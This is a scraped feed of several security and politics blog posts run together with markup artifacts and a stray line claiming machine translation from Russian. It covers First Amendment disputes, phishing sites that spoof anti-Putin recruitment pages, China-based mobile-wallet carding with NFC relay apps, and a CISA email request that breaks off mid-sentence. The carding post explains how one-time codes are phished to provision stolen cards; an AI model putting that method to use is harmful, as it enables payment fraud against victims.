<strong>U.S. Immigration and Customs Enforcement</strong> (ICE) agents have been <a href=\"https://apnews.com/article/immigration-detainees-students-ozturk-khalil-78f544fb2c8b593c88a0c1f0e0ad9c5f\" rel=\"noopener\" target=\"_blank\">detaining and trying to deport</a> pro-Palestinian students who are legally in the United States. The administration is targeting students and academics who spoke out against Israel&#8217;s attacks on Gaza, or who were active in campus protests against U.S. support for the attacks. <strong>Secretary of State Marco Rubio</strong> <a href=\"https://thehill.com/homenews/education/5218410-ice-arrests-tufts-alabama-students-trump-immigration-crackdown-rumeysa-ozturk-khalil/\" rel=\"noopener\" target=\"_blank\">told reporters Thursday</a> that at least 300 foreign students have seen their visas revoked under President Trump, a far higher number than was previously known.</p>\n<p>In his first term, Trump threatened to use the national guard or the U.S. military to deal with protesters, and in campaigning for re-election he promised to revisit the idea.</p>\n<p>“I think the bigger problem is the enemy from within,” Trump told <strong>Fox News</strong> in October 2024. “We have some very bad people. We have some sick people, radical left lunatics. And I think they’re the big — and it should be very easily handled by, if necessary, by National Guard, or if really necessary, by the military, because they can’t let that happen.”</p>\n<p>This term, Trump acted swiftly to remove the top judicial advocates in the armed forces who would almost certainly push back on any request by the president to use U.S. soldiers in an effort to quell public protests, or to arrest and detain immigrants. In late February, the president and <strong>Defense Secretary Pete Hegseth</strong> fired the top legal officers for the military services &#8212; those responsible for ensuring the Uniform Code of Military Justice is followed by commanders.</p>\n<p>Military.com <a href=\"https://www.military.com/daily-news/2025/02/24/people-are-very-scared-trump-administration-purge-of-jag-officers-raises-legal-ethical-fears.html\" rel=\"noopener\" target=\"_blank\">warns</a> that the purge &#8220;sets an alarming precedent for a crucial job in the military, as President Donald Trump has mused about using the military in unorthodox and potentially illegal ways.&#8221; Hegseth told reporters the removals were necessary because he didn&#8217;t want them to pose any &#8220;roadblocks to orders that are given by a commander in chief.&#8221;<span id=\"more-70660\"></span></p>\n<h2>FREEDOM OF THE PRESS</h2>\n<p>President Trump has sued a number of U.S. news outlets, including <strong>60 Minutes</strong>, <strong>CNN</strong>, <strong>The Washington Post</strong>, <strong>The New York Times</strong> and other smaller media organizations for unflattering coverage.</p>\n<p>In a $10 billion lawsuit against 60 Minutes and its parent <strong>Paramount</strong>, Trump claims they selectively edited an interview with former <strong>Vice President Kamala Harris</strong> prior to the 2024 election. The TV news show last month published transcripts of the interview at the heart of the dispute, but Paramount is <a href=\"https://apnews.com/article/cbs-60-minutes-lawsuit-trump-pelley-58339cc1a1eb52739bb365e2e8c6d8bc\" rel=\"noopener\" target=\"_blank\">reportedly considering a settlement</a> to avoid potentially damaging its chances of winning the administration&#8217;s approval for a pending multibillion-dollar merger.</p>\n<p>The president <a href=\"https://www.desmoinesregister.com/story/news/crime-and-courts/2025/02/25/dismissal-sought-donald-trump-lawsuit-pollster-ann-selzer-des-moines-register-iowa-poll/79442387007/\" rel=\"noopener\" target=\"_blank\">sued The Des Moines Register</a> and its parent company, <strong>Gannett</strong>, for publishing a poll showing Trump trailing Harris in the 2024 presidential election in Iowa (a state that went for Trump). The POTUS also is <a href=\"https://www.politico.com/news/2024/07/21/trump-libel-suit-pulitzer-prize-00169975\" rel=\"noopener\" target=\"_blank\">suing the Pulitzer Prize board</a> over 2018 awards given to The New York Times and The Washington Post for their coverage of purported Russian interference in the 2016 election.</p>\n<p>Whether or not any of the president&#8217;s lawsuits against news organizations have merit or succeed is almost beside the point. The strategy behind suing the media is to make reporters and newsrooms think twice about criticizing or challenging the president and his administration. The president also knows some media outlets will find it more expedient to settle.</p>\n<p>Trump also sued <strong>ABC News</strong> and <strong>George Stephanopoulos</strong> for stating that the president had been found liable for &#8220;rape&#8221; in a civil case [Trump was found liable of sexually abusing and defaming E. Jean Carroll]. ABC parent <strong>Disney</strong> settled that claim by agreeing to donate $15 million to the Trump Presidential Library.</p>\n<p>Following the attack on the U.S. Capitol on Jan. 6, 2021, <strong>Facebook</strong> blocked President Trump&#8217;s account. Trump sued <strong>Meta</strong>, and after the president&#8217;s victory in 2024 Meta <a class=\"sc-19cc8fd2-0 kspHIT\" href=\"https://www.wsj.com/us-news/law/trump-signs-agreement-calling-for-meta-to-pay-25-million-to-settle-suit-6f734c8c?mod=article_inline\" rel=\"noopener\" target=\"_blank\">settled</a> and agreed to pay Trump $25 million: $22 million would go to his presidential library, and the rest to legal fees. <strong>Meta CEO Mark Zuckerberg</strong> also announced Facebook and Instagram would <a href=\"https://www.cnn.com/2025/01/07/tech/meta-censorship-moderation/index.html\" rel=\"noopener\" target=\"_blank\">get rid of fact-checkers</a> and rely instead on reader-submitted &#8220;community notes&#8221; to debunk disinformation on the social media platform.</p>\n<p><strong>Brendan Carr</strong>, the president&#8217;s pick to run the <strong>Federal Communications Commission</strong> (FCC), has pledged to &#8220;dismantle the censorship cartel and restore free speech rights for everyday Americans.&#8221; But on January 22, 2025, the FCC reopened complaints against ABC, <strong>CBS</strong> and <strong>NBC</strong> over their coverage of the 2024 election. The previous FCC chair had dismissed the complaints as attacks on the First Amendment and an attempt to weaponize the agency for political purposes.</p>\n<p>According to Reuters, the complaints call for an investigation into how ABC News moderated the pre-election TV debate between Trump and Biden, and appearances of then-Vice President Harris on 60 Minutes and on NBC&#8217;s &#8220;Saturday Night Live.&#8221;</p>\n<p>Since then, the FCC has opened investigations into <strong>NPR</strong> and <strong>PBS</strong>, <a href=\"https://www.npr.org/2025/01/30/nx-s1-5281162/fcc-npr-pbs-investigation\" rel=\"noopener\" target=\"_blank\">alleging</a> that they are breaking sponsorship rules. The <strong>Center for Democracy &amp; Technology </strong>(CDT), a think tank based in Washington, D.C., <a href=\"https://cdt.org/insights/when-it-comes-to-free-speech-the-trump-administration-should-follow-its-own-order/\" rel=\"noopener\" target=\"_blank\">noted</a> that the FCC is also investigating <strong>KCBS</strong> in San Francisco for reporting on the location of federal immigration authorities.</p>\n<p>&#8220;Even if these investigations are ultimately closed without action, the mere fact of opening them – and the implicit threat to the news stations’ license to operate – can have the effect of deterring the press from news coverage that the Administration dislikes,&#8221; the CDT&#8217;s <strong>Kate Ruane</strong> observed.</p>\n<p>Trump has repeatedly threatened to &#8220;open up&#8221; libel laws, with the goal of making it easier to sue media organizations for unfavorable coverage. But this week, the U.S. Supreme Court <a href=\"https://nymag.com/intelligencer/article/supreme-court-thwarts-trump-dream-of-opening-up-libel-laws.html\" rel=\"noopener\" target=\"_blank\">declined to hear a challenge</a> brought by Trump donor and Las Vegas casino magnate Steve Wynn to overturn the landmark 1964 decision in <em>New York Times v. Sullivan</em>, which insulates the press from libel suits over good-faith criticism of public figures.</p>\n<p>The president also has insisted on picking which reporters and news outlets should be allowed to cover White House events and participate in the press pool that trails the president. He barred the <strong>Associated Press</strong> from the White House and Air Force One over their refusal to call the Gulf of Mexico by another name.</p>\n<p>And the Defense Department has ordered a number of top media outlets <a href=\"https://www.reuters.com/world/us/pentagon-doubles-number-news-outlets-rotate-out-office-spaces-2025-02-08/\" rel=\"noopener\" target=\"_blank\">to vacate their spots at the Pentagon</a>, including CNN, The Hill, The Washington Post, The New York Times, NBC News, Politico and National Public Radio.</p>\n<p>&#8220;Incoming media outlets include the New York Post, Breitbart, the Washington Examiner, the Free Press, the Daily Caller, Newsmax, the Huffington Post and One America News Network, most of whom are seen as conservative or favoring Republican President Donald Trump,&#8221; Reuters reported.</p>\n<h2>FREEDOM OF SPEECH</h2>\n<p>Shortly after Trump took office again in January 2025, the administration began circulating <a href=\"https://www.nytimes.com/interactive/2025/03/07/us/trump-federal-agencies-websites-words-dei.html\" rel=\"noopener\" target=\"_blank\">lists of hundreds of words</a> that government staff and agencies shall not use in their reports and communications.</p>\n<p>The Brookings Institution <a href=\"https://www.brookings.edu/articles/the-us-government-data-purge-is-a-loss-for-policymaking-and-research/\" rel=\"noopener\" target=\"_blank\">notes</a> that in moving to comply with this anti-speech directive, federal agencies have purged countless taxpayer-funded data sets from a swathe of government websites, including data on crime, sexual orientation, gender, education, climate, and global development.</p>\n<p><strong>The New York Times</strong> reports that in the past two months, hundreds of terabytes of digital resources analyzing data have been taken off government websites.</p>\n<p>&#8220;While in many cases the underlying data still exists, the tools that make it possible for the public and researchers to use that data have been removed,&#8221; The Times <a href=\"https://www.nytimes.com/2025/03/21/climate/government-websites-climate-environment-data.html\" rel=\"noopener\" target=\"_blank\">wrote</a>.</p>\n<p>On Jan. 27, Trump issued <a href=\"https://www.washingtonpost.com/documents/deb7af80-48b6-4b8a-8bfa-3d84fd7c3ec8.pdf\" rel=\"noopener\" target=\"_blank\">a memo</a> (PDF) that paused all federally funded programs pending a review of those programs for alignment with the administration&#8217;s priorities. Among those was ensuring that no funding goes toward advancing &#8220;Marxist equity, transgenderism, and green new deal social engineering policies.&#8221;</p>\n<p>According to the CDT, this order is a blatant attempt to force government grantees to cease engaging in speech that the current administration dislikes, including speech about the benefits of diversity, climate change, and LGBTQ issues.</p>\n<p>&#8220;The First Amendment does not permit the government to discriminate against grantees because it does not like some of the viewpoints they espouse,&#8221; the CDT&#8217;s Ruane wrote. &#8220;Indeed, those groups that are challenging the constitutionality of the order argued as much in their complaint, and have won an injunction blocking its implementation.&#8221;</p>\n<p>On January 20, the same day Trump issued an executive order on free speech, the president also issued an executive order titled “<a href=\"https://www.whitehouse.gov/presidential-actions/2025/01/reevaluating-and-realigning-united-states-foreign-aid/\" rel=\"noopener\" target=\"_blank\">Reevaluating and Realigning United States Foreign Aid</a>,” which froze funding for programs run by the <strong>U.S. Agency for International Development</strong> (USAID). Among those were programs designed to empower civil society and human rights groups, journalists and others responding to digital repression and Internet shutdowns.</p>\n<p>According to the <strong>Electronic Frontier Foundation</strong> (EFF), this includes many freedom technologies that use cryptography, fight censorship, protect freedom of speech, privacy and anonymity for millions of people around the world.</p>\n<p>&#8220;While the State Department has issued some limited waivers, so far those waivers do not seem to cover the open source internet freedom technologies,&#8221; the EFF <a href=\"https://www.eff.org/deeplinks/2025/01/executive-order-state-department-sideswipes-freedom-tools-threatens-censorship\" rel=\"noopener\" target=\"_blank\">wrote</a> about the USAID disruptions. &#8220;As a result, many of these projects have to stop or severely curtail their work, lay off talented workers, and stop or slow further development.&#8221;</p>\n<p>On March 14, the president signed <a href=\"https://www.whitehouse.gov/presidential-actions/2025/03/continuing-the-reduction-of-the-federal-bureaucracy/\" rel=\"noopener\" target=\"_blank\">another executive order</a> that effectively gutted the <strong>U.S. Agency for Global Media</strong> (USAGM), which oversees or funds media outlets including <strong>Radio Free Europe/Radio Liberty</strong> and <strong>Voice of America</strong> (VOA). The USAGM also oversees <strong>Radio Free Asia</strong>, which supporters say has been one of the most reliable tools used by the government to combat Chinese propaganda.</p>\n<p>But this week, <strong>U.S. District Court Judge Royce Lamberth</strong>, a Reagan appointee, <a href=\"https://www.npr.org/2025/03/26/nx-s1-5341321/trump-radio-free-europe-radio-liberty-restraining-order\" rel=\"noopener\" target=\"_blank\">temporarily blocked USAGM&#8217;s closure</a> by the administration.</p>\n<p>“RFE/RL has, for decades, operated as one of the organizations that Congress has statutorily designated to carry out this policy,” Lamberth <a href=\"https://storage.courtlistener.com/recap/gov.uscourts.dcd.278524/gov.uscourts.dcd.278524.14.0.pdf\" rel=\"noreferrer noopener\" target=\"_blank\">wrote in a 10-page opinion</a>. “The leadership of USAGM cannot, with one sentence of reasoning offering virtually no explanation, force RFE/RL to shut down — even if the President has told them to do so.”</p>\n<h2>FREEDOM OF RELIGION</h2>\n<p>The Trump administration <a href=\"https://www.dhs.gov/news/2025/01/21/statement-dhs-spokesperson-directives-expanding-law-enforcement-and-ending-abuse\" rel=\"noopener\" target=\"_blank\">rescinded a decades-old policy</a> that instructed officers not to take immigration enforcement actions in or near &#8220;sensitive&#8221; or &#8220;protected&#8221; places, such as churches, schools, and hospitals.</p>\n<p>That directive was immediately challenged in a case brought by a group of Quakers, Baptists and Sikhs, who argued the policy reversal was keeping people from attending services for fear of being arrested on civil immigration violations. On Feb. 24, a federal judge agreed and <a href=\"https://www.usatoday.com/story/news/politics/2025/02/24/judge-blocks-immigration-enforcement-churches/80043880007/\" rel=\"noopener\" target=\"_blank\">blocked</a> ICE agents from entering churches or targeting migrants nearby.</p>\n<p>The president&#8217;s executive order allegedly addressing antisemitism came with <a href=\"https://www.whitehouse.gov/fact-sheets/2025/01/fact-sheet-president-donald-j-trump-takes-forceful-and-unprecedented-steps-to-combat-anti-semitism/\" rel=\"noopener\" target=\"_blank\">a fact sheet</a> that described college campuses as &#8220;infested&#8221; with &#8220;terrorists&#8221; and &#8220;jihadists.&#8221; Multiple faith groups expressed alarm over the order, saying it attempts to <a href=\"https://www.npr.org/2025/03/20/nx-s1-5326047/kenneth-stern-antimsietim-executive-order-free-speech\" rel=\"noopener\" target=\"_blank\">weaponize antisemitism</a> and promote &#8220;<a href=\"https://www.ucc.org/faith-that-calls-for-welcome-confronts-the-harshest-anti-immigrant-policies-in-modern-u-s-history/\" rel=\"noopener\" target=\"_blank\">dehumanizing anti-immigrant policies.</a>&#8221;</p>\n<p>The president also <a href=\"https://apnews.com/article/trump-national-prayer-breakfast-30ff6f55a2e3c7b8643a15e7b158537d\" rel=\"noopener\" target=\"_blank\">announced</a> the creation of a &#8220;Task Force to Eradicate Anti-Christian Bias,&#8221; to be led by Attorney General Pam Bondi. Never mind that Christianity is easily the largest faith in America and that Christians are well-represented in Congress.</p>\n<p>The <strong>Rev. Paul Brandeis Raushenbush</strong>, a Baptist minister and head of the progressive <strong>Interfaith Alliance</strong>, issued a statement accusing Trump of hypocrisy in claiming to champion religion by creating the task force.</p>\n<p>“From allowing immigration raids in churches, to targeting faith-based charities, to suppressing religious diversity, the Trump Administration’s aggressive government overreach is infringing on religious freedom in a way we haven’t seen for generations,” Raushenbush said.</p>\n<p>A <a href=\"https://www.au.org/the-latest/press/task-force-anti-christian-bias-trump/\" rel=\"noopener\" target=\"_blank\">statement</a> from <strong>Americans United for Separation of Church and State</strong> said the task force could lead to religious persecution of those with other faiths.</p>\n<p>&#8220;Rather than protecting religious beliefs, this task force will misuse religious freedom to justify bigotry, discrimination, and the subversion of our civil rights laws,&#8221; said Rachel Laser, the group&#8217;s president and CEO.</p>\n<p>Where is President Trump going with all these blatant attacks on the First Amendment? The president has made no secret of his affection for autocratic leaders and &#8220;strongmen&#8221; around the world, and he is particularly enamored with Hungary&#8217;s far-right <strong>Prime Minister Viktor Orbán</strong>, who has visited Trump&#8217;s Mar-a-Lago resort twice in the past year.</p>\n<p>A <a href=\"https://www.theatlantic.com/ideas/archive/2025/03/trumps-press-freedom-hungary-orban/682060/\" rel=\"noopener\" target=\"_blank\">March 15 essay</a> in The Atlantic by Hungarian investigative journalist <strong>András Pethő</strong> recounts how Orbán rose to power by consolidating control over the courts, and by building his own media universe while simultaneously placing a stranglehold on the independent press.</p>\n<p>&#8220;As I watch from afar what’s happening to the free press in the United States during the first weeks of Trump’s second presidency — the verbal bullying, the legal harassment, the buckling by media owners in the face of threats — it all looks very familiar,&#8221; Pethő wrote. &#8220;The MAGA authorities have learned Orbán’s lessons well.&#8221;</p>",

The text has been machine-translated from Russian.</p></div>\n<p>Researchers at the security firm <strong>Silent Push</strong> mapped a network of several dozen phishing domains that spoof the recruitment websites of Ukrainian paramilitary groups, as well as Ukrainian government intelligence sites.</p>\n<p>The website <strong>legiohliberty[.]army</strong> features a carbon copy of the homepage for the <a href=\"https://en.wikipedia.org/wiki/Freedom_of_Russia_Legion\" rel=\"noopener\" target=\"_blank\">Freedom of Russia Legion</a> (a.k.a. &#8220;Free Russia Legion&#8221;), a three-year-old Ukraine-based paramilitary unit made up of Russian citizens who oppose Vladimir Putin and his invasion of Ukraine.</p>\n<p>The phony version of that website copies the legitimate site &#8212; <strong>legionliberty[.]army &#8212; </strong>providing an interactive <strong>Google Form</strong> where interested applicants can share their contact and personal details. The form asks visitors to provide their name, gender, age, email address and/or Telegram handle, country, citizenship, experience in the armed forces; political views; motivations for joining; and any bad habits.</p>\n<p>&#8220;Participation in such anti-war actions is considered illegal in the Russian Federation, and participating citizens are regularly charged and arrested,&#8221; Silent Push wrote in a report released today. &#8220;All observed campaigns had similar traits and shared a common objective: collecting personal information from site-visiting victims. Our team believes it is likely that this campaign is the work of either Russian Intelligence Services or a threat actor with similarly aligned motives.&#8221;</p>\n<p>Silent Push&#8217;s <strong>Zach Edwards</strong> said the fake Legion Liberty site shared multiple connections with <strong>rusvolcorps[.]net</strong>. That domain mimics the recruitment page for a Ukrainian far-right paramilitary group called the <a href=\"https://en.wikipedia.org/wiki/Russian_Volunteer_Corps\" rel=\"noopener\" target=\"_blank\">Russian Volunteer Corps</a> (rusvolcorps[.]com), and uses a similar Google Forms page to collect information from would-be members.</p>\n<p>Other domains Silent Push connected to the phishing scheme include: <strong>ciagov[.]icu</strong>, which mirrors the content on the official website of the <strong>U.S. Central Intelligence Agency</strong>; and <strong>hochuzhitlife[.]com</strong>, which spoofs the <strong>Ministry of Defense of Ukraine &amp; General Directorate of Intelligence</strong> (whose actual domain is <strong>hochuzhit[.]com</strong>).</p>\n<p><img alt=\"\" class=\"aligncenter wp-image-70814\" height=\"775\" src=\"https://krebsonsecurity.com/wp-content/uploads/2025/03/recruit-form.png\" width=\"749\" /></p>\n<p>According to Edwards, there are no signs that these phishing sites are being advertised via email. Rather, it appears those responsible are promoting them by manipulating the search engine results shown when someone searches for one of these anti-Putin organizations.</p>\n<p>In August 2024, security researcher <strong>Artem Tamoian</strong> posted <a href=\"https://x.com/artemtam\" rel=\"noopener\" target=\"_blank\">on Twitter/X</a> about how he received startlingly different results when he searched for &#8220;Freedom of Russia legion&#8221; in Russia&#8217;s largest domestic search engine <strong>Yandex</strong> versus Google.com. The top result returned by Google was the legion&#8217;s actual website, while the first result on Yandex was a phishing page targeting the group.</p>\n<p>&#8220;I think at least some of them are surely promoted via search,&#8221; Tamoian said of the phishing domains. &#8220;My first thread on that accuses Yandex, but apart from Yandex those websites are consistently ranked above legitimate in DuckDuckGo and Bing. Initially, I didn&#8217;t realize the scale of it. They keep appearing to this day.&#8221;<span id=\"more-70785\"></span></p>\n<p>Tamoian, a native Russian who left the country in 2019, is the founder of the cyber investigation platform <a href=\"https://malfors.com\" rel=\"noopener\" target=\"_blank\">malfors.com</a>. He recently discovered two other sites impersonating the Ukrainian paramilitary groups &#8212; <strong>legionliberty[.]world</strong> and <strong>rusvolcorps[.]ru</strong> &#8212; and reported both to Cloudflare. When Cloudflare responded by blocking the sites with a phishing warning, the real Internet address of these sites <a href=\"https://krebsonsecurity.com/wp-content/uploads/2025/03/rusvolcorps-stark.png\" rel=\"noopener\" target=\"_blank\">was exposed</a> as belonging to a known &#8220;bulletproof hosting&#8221; network called <strong>Stark Industries Solutions Ltd</strong>.</p>\n<p>Stark Industries Solutions appeared two weeks before Russia invaded Ukraine in February 2022, materializing out of nowhere with hundreds of thousands of Internet addresses in its stable &#8212; many of them originally assigned to Russian government organizations. In May 2024, KrebsOnSecurity <a href=\"https://krebsonsecurity.com/2024/05/stark-industries-solutions-an-iron-hammer-in-the-cloud/\" rel=\"noopener\" target=\"_blank\">published a deep dive on Stark</a>, which has repeatedly been used to host infrastructure for distributed denial-of-service (DDoS) attacks, phishing, malware and disinformation campaigns from Russian intelligence agencies and pro-Kremlin hacker groups.</p>\n<p>In March 2023, Russia’s Supreme Court designated the Freedom of Russia legion as a terrorist organization, meaning that Russians caught communicating with the group could face between 10 and 20 years in prison.</p>\n<p>Tamoian said those searching online for information about these paramilitary groups have become easy prey for Russian security services.</p>\n<p>&#8220;I started looking into those phishing websites, because I kept stumbling upon news that someone gets arrested for trying to join [the] Ukrainian Army or for trying to help them,&#8221; Tamoian told KrebsOnSecurity. &#8220;I have also seen reports [of] FSB contacting people impersonating Ukrainian officers, as well as using fake Telegram bots, so I thought fake websites might be an option as well.&#8221;</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_70810\" style=\"width: 622px;\"><img alt=\"\" class=\"size-full wp-image-70810\" height=\"802\" src=\"https://krebsonsecurity.com/wp-content/uploads/2025/03/legion-arrests.png\" width=\"612\" /><p class=\"wp-caption-text\" id=\"caption-attachment-70810\">Search results showing news articles about people in Russia being sentenced to lengthy prison terms for attempting to aid Ukrainian paramilitary groups.</p></div>\n<p>Tamoian said <a href=\"https://en.zona.media/article/2024/10/15/phish-trl\" rel=\"noopener\" target=\"_blank\">reports surface regularly in Russia</a> about people being arrested for trying carry out an action requested by a &#8220;Ukrainian recruiter,&#8221; with the courts unfailingly imposing harsh sentences regardless of the defendant’s age.</p>\n<p>&#8220;This keeps happening regularly, but usually there are no details about how exactly the person gets caught,&#8221; he said. &#8220;All cases related to state treason [and] terrorism are classified, so there are barely any details.&#8221;</p>\n<p>Tamoian said while he has no direct evidence linking any of the reported arrests and convictions to these phishing sites, he is certain the sites are part of a larger campaign by the Russian government.</p>\n<p>&#8220;Considering that they keep them alive and keep spawning more, I assume it might be an efficient thing,&#8221; he said. &#8220;They are on top of DuckDuckGo and Yandex, so it unfortunately works.&#8221;</p>\n<p>Further reading: Silent Push report, <a href=\"https://www.silentpush.com/blog/russian-intelligence-phishing\" rel=\"noopener\" target=\"_blank\">Russian Intelligence Targeting its Citizens and Informants</a>.</p>",

The Knox County Sheriff&#8217;s office said the arrests are considered the first in the nation for a new type of tap-to-pay fraud.</p>\n<p>Responding to questions about what makes this scheme so remarkable, Knox County said that while it appears the fraudsters are simply buying gift cards, in fact they are using multiple transactions to purchase various gift cards and are plying their scam from state to state.</p>\n<p>&#8220;These offenders have been traveling nationwide, using stolen credit card information to purchase gift cards and launder funds,&#8221; Knox County Chief Deputy <strong>Bernie Lyon</strong> wrote. &#8220;During Monday’s operation, we recovered gift cards valued at over $23,000, all bought with unsuspecting victims’ information.&#8221;</p>\n<p>Asked for specifics about the mobile devices seized from the suspects, Lyon said &#8220;tap-to-pay fraud involves a group <em>utilizing Android phones to conduct Apple Pay transactions</em> utilizing stolen or compromised credit/debit card information,&#8221; [emphasis added].</p>\n<p>Lyon declined to offer additional specifics about the mechanics of the scam, citing an ongoing investigation.</p>\n<p><strong>Ford Merrill</strong> works in security research at <a href=\"https://www.secalliance.com/\" rel=\"noopener\" target=\"_blank\">SecAlliance</a>, a <a href=\"https://www.csis.com/\" rel=\"noopener\" target=\"_blank\">CSIS Security Group</a> company. Merrill said there aren&#8217;t many valid use cases for Android phones to transmit Apple Pay transactions. That is, he said, unless they are running a custom Android app that KrebsOnSecurity wrote about last month as part of <a href=\"https://krebsonsecurity.com/2025/02/how-phished-data-turns-into-apple-google-wallets/\" rel=\"noopener\" target=\"_blank\">a deep dive into the operations of China-based phishing cartels</a> that are breathing new life into the payment card fraud industry (a.k.a. &#8220;carding&#8221;).</p>\n<p>How are these China-based phishing groups obtaining stolen payment card data and then loading it onto Google and Apple phones? It all starts with phishing.</p>\n<p>If you own a mobile phone, the chances are excellent that at some point in the past two years it has received at least one phishing message that spoofs the <strong>U.S. Postal Service</strong> to supposedly collect some outstanding delivery fee, or an SMS that pretends to be a local toll road operator warning of a delinquent toll fee.</p>\n<p>These messages are being sent through sophisticated phishing kits sold by several cybercriminals based in mainland China. And they are not traditional SMS phishing or “<strong>smishing</strong>” messages, as they bypass the mobile networks entirely. Rather, the missives are sent through the <strong>Apple iMessage</strong> service and through <a href=\"https://en.wikipedia.org/wiki/Rich_Communication_Services\" rel=\"noopener\" target=\"_blank\">RCS</a>, the functionally equivalent technology on <strong>Google</strong> phones.</p>\n<p>People who enter their payment card data at one of these sites will be told their financial institution needs to verify the small transaction by sending a one-time passcode to the customer’s mobile device. In reality, that code will be sent by the victim’s financial institution in response to a request by the fraudsters to link the phished card data to a mobile wallet.</p>\n<p>If the victim then provides that one-time code, the phishers will link the card data to a new mobile wallet from Apple or Google, loading the wallet onto a mobile phone that the scammers control. These phones are then loaded with multiple stolen wallets (often between 5-10 per device) and sold in bulk to scammers on Telegram.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_70436\" style=\"width: 760px;\"><img alt=\"\" class=\" wp-image-70436\" height=\"567\" src=\"https://krebsonsecurity.com/wp-content/uploads/2025/02/phishingphones.png\" width=\"750\" /><p class=\"wp-caption-text\" id=\"caption-attachment-70436\">An image from the Telegram channel for a popular Chinese smishing kit vendor shows 10 mobile phones for sale, each loaded with 5-7 digital wallets from different financial institutions.</p></div>\n<p>Merrill found that at least one of the Chinese phishing groups sells an Android app called “<strong>Z-NFC</strong>” that can relay a valid NFC transaction to anywhere in the world. The user simply waves their phone at a local payment terminal that accepts Apple or Google pay, and the app relays an NFC transaction over the Internet from a phone in China.</p>\n<p>&#8220;I would be shocked if this wasn&#8217;t the NFC relay app,&#8221; Merrill said, concerning the arrested suspects in Tennessee.</p>\n<div style=\"text-align: center;\"></div>\n<p>Merrill said the Z-NFC software can work from anywhere in the world, and that one phishing gang offers the software for $500 a month.</p>\n<p>&#8220;It can relay both NFC enabled tap-to-pay as well as any digital wallet,&#8221; Merrill said. &#8220;They even have 24-hour support.&#8221;<span id=\"more-70697\"></span></p>\n<p>On March 16, the ABC affiliate in Sacramento (<strong>ABC10</strong>), Calif. <a href=\"https://www.youtube.com/watch?v=dUjaj0d1T6A\" rel=\"noopener\" target=\"_blank\">aired a segment</a> about two Chinese nationals who were arrested after using an app to run stolen credit cards at a local Target store. The news story quoted investigators saying the men were trying to buy gift cards using a mobile app that cycled through more than 80 stolen payment cards.</p>\n<p>ABC10 reported that while most of those transactions were declined, the suspects still made off with $1,400 worth of gift cards. After their arrests, both men reportedly admitted that they were being paid $250 a day to conduct the fraudulent transactions.</p>\n<p>Merrill said it&#8217;s not unusual for fraud groups to advertise this kind of work on social media networks, including TikTok.</p>\n<p>A <strong>CBS News</strong> <a href=\"https://www.cbsnews.com/sacramento/news/sacramento-county-credit-card-scheme-arrest-chinese-nationals/\" rel=\"noopener\" target=\"_blank\">story</a> on the Sacramento arrests said one of the suspects tried to use 42 separate bank cards, but that 32 were declined. Even so, the man still was reportedly able to spend $855 in the transactions.</p>\n<p>Likewise, the suspect&#8217;s alleged accomplice tried 48 transactions on separate cards, finding success 11 times and spending $633, CBS reported.</p>\n<p>&#8220;It&#8217;s interesting that so many of the cards were declined,&#8221; Merrill said. &#8220;One reason this might be is that banks are getting better at detecting this type of fraud. The other could be that the cards were already used and so they were already flagged for fraud even before these guys had a chance to use them. So there could be some element of just sending these guys out to stores to see if it works, and if not they&#8217;re on their own.&#8221;</p>\n<p>Merrill&#8217;s investigation into the Telegram sales channels for these China-based phishing gangs shows their phishing sites are actively manned by fraudsters who sit in front of giant racks of Apple and Google phones that are used to send the spam and respond to replies in real time.</p>\n<p>In other words, the phishing websites are powered by real human operators as long as new messages are being sent. Merrill said the criminals appear to send only a few dozen messages at a time, likely because completing the scam takes manual work by the human operators in China. After all, most one-time codes used for mobile wallet provisioning are generally only good for a few minutes before they expire.</p>\n<p>For more on how these China-based mobile phishing groups operate, check out <a href=\"https://krebsonsecurity.com/2025/02/how-phished-data-turns-into-apple-google-wallets/\" rel=\"noopener\" target=\"_blank\">How Phished Data Turns Into Apple and Google Wallets</a>.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_70435\" style=\"width: 528px;\"><img alt=\"\" class=\"size-full wp-image-70435\" height=\"688\" src=\"https://krebsonsecurity.com/wp-content/uploads/2025/02/phonesashtray.png\" width=\"518\" /><p class=\"wp-caption-text\" id=\"caption-attachment-70435\">The ashtray says: You&#8217;ve been phishing all night.</p></div>",

        "content": "<p>A message posted on Monday to the homepage of the <strong>U.S. Cybersecurity &amp; Infrastructure Security Agency</strong> (CISA) is the latest exhibit in the Trump administration&#8217;s continued disregard for basic cybersecurity protections. The message instructed recently-fired CISA employees to get in touch so they can be rehired and then immediately placed on leave, asking employees to send their Social Security number or date of birth in a password-protected email attachment &#8212; presumably with the password needed to view the file included in the body of the email.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_70732\" style=\"width: 757px;\"><img alt=\"\" class=\" wp-image-70732\" height=\"371\" src=\"https://krebsonsecurity.com/wp-content/uploads/2025/03/cisa-resinstatement.png\" width=\"747\" /><p class=\"wp-caption-text\" id=\"caption-attachment-70732\">The homepage of cisa.gov as it appeared on Monday and Tuesday afternoon.</p></div>\n<p>On March 13, a Maryland district court judge <a href=\"https://www.cbsnews.com/news/fired-cisa-probationary-employees-reinstated/\" rel=\"noopener\" target=\"_blank\">ordered</a> the Trump administration to reinstate more than 130 probationary CISA employees who were fired last month. On Monday, the administration announced that those dismissed employees would be reinstated but placed on paid administrative leave. They are among nearly 25,000 fired federal workers who are in the process of being rehired.</p>\n<p>A notice covering the CISA homepage said the administration is making every effort to contact those who were unlawfully fired in mid-February.</p>\n<p>&#8220;Please provide a password protected attachment that provides your full name, your dates of employment (including date of termination), and one other identifying factor such as date of birth or social security number,&#8221; the message reads. &#8220;Please, to the extent that it is available, attach any termination notice.&#8221;</p>\n<p>The message didn&#8217;t specify how affected CISA employees should share the password for any attached files, so the implicit expectation is that employees should just include the plaintext password in their message.</p>\n<p>Email is about as secure as a postcard sent through the mail, because anyone who manages to intercept the missive anywhere along its path of delivery can likely read it. In security terms, that&#8217;s the equivalent of encrypting sensitive data while also attaching the secret key needed to view the information.</p>\n<p>What&#8217;s more, a great many antivirus and security scanners have trouble inspecting password-protected files, meaning the administration&#8217;s instructions are likely to increase the risk that malware submitted by cybercriminals could be accepted and opened by U.S. government employees.</p>\n<p>The message in the screenshot above was removed from the CISA homepage Tuesday evening and replaced with a much shorter notice directing former CISA employees to contact a specific email address. But a slightly different version of the same message originally posted to CISA&#8217;s website <a href=\"https://www.uscis.gov/newsroom/alerts/uscis-probationary-reinstatements\" rel=\"noopener\" target=\"_blank\">still exists</a> at the website for the <strong>U.S. Citizenship and Immigration Services</strong>, which likewise instructs those fired employees who wish to be 